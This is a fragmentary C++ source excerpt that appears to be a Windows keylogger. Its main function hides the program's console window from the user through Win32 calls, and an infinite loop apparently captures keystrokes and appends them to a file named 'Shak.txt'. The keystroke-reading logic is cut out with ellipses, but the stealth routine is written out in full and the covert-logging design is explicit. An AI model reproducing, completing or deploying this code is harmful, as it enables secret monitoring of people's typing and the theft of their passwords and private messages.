...
int main()
{
	hide(); // to hide the console for user
	check();
	return 0;
}
...
void check()
{
	...
	for (;;)                //infinite loop
	{
									 ...
									 // read ( range got from ASCII codes )
		{
			...
			{
				ofstream write("Shak.txt", ios::app);
...
void hide()
{
	HWND stealth;                                       // HWND is a "handle to a window" and is part of the Win32 API
	AllocConsole();                                     // from windows.h header
	stealth = FindWindowA("ConsoleWindowClass", NULL);  // from winuser.h
	ShowWindow(stealth,0);                              // from winuser.h
}
